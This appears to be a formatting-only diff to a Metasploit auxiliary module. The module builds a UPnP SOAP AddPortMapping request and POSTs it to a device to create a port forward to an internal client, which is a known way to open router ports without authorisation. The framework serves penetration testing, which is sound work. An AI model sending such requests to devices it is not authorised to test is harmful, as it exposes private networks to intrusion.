@@ -17,7 +17,7 @@ class Metasploit3 < Msf::Auxiliary
     )
     register_options(
       [
-        OptString.new('TARGETURI',[true, 'UPnP control URL', '/' ]),
+        OptString.new('TARGETURI', [true, 'UPnP control URL', '/' ]),
         OptString.new('INTERNAL_CLIENT', [true, 'New Internal Client']),
         OptInt.new('INTERNAL_PORT', [true, 'New Internal Port']),
         OptInt.new('EXTERNAL_PORT', [true, 'New External Port'])
@@ -25,8 +25,8 @@ class Metasploit3 < Msf::Auxiliary
       self.class
     )
   end
-  def run
 
+  def run
     content = "<?xml version=\"1.0\"?>"
     content << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
     content << "<SOAP-ENV:Body>"
@@ -43,14 +43,12 @@ class Metasploit3 < Msf::Auxiliary
     content << "</SOAP-ENV:Body>"
     content << "</SOAP-ENV:Envelope>"
     res = send_request_cgi(
-      {
-        'uri'           => normalize_uri(target_uri.path),
-        'method'        => 'POST',
-        'content-type'  =>  'text/xml;charset="utf-8"',
-        'headers'       => {
-          'SoapAction'  => 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'
-        },
-        'data'          => content
+      'uri'           => normalize_uri(target_uri.path),
+      'method'        => 'POST',
+      'content-type'  => 'text/xml;charset="utf-8"',
+      'data'          => content,
+      'headers'       => {
+        'SoapAction'  => 'urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping'
       }
     )
 
